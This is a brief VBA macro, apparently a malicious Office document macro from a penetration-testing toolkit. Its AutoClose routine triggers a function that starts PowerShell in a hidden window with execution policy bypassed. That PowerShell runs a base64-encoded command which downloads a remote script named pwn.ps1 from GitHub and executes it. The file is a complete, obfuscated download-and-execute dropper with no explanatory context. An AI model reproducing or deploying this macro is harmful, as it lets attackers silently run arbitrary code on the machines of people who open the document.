Function Payload() As Boolean
    Shell ("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -encodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AdABmAGEAaQByAGEAbgBlAC8AUABlAG4AdABlAHMAdAAvAG0AYQBzAHQAZQByAC8AVgBlAGMAdABvAHIAcwAvAHAAdwBuAC4AcABzADEAIgApACkALgBjAG8AbgB0AGUAbgB0AA==")
End Function

Public Sub AutoClose()
    Payload
End Sub
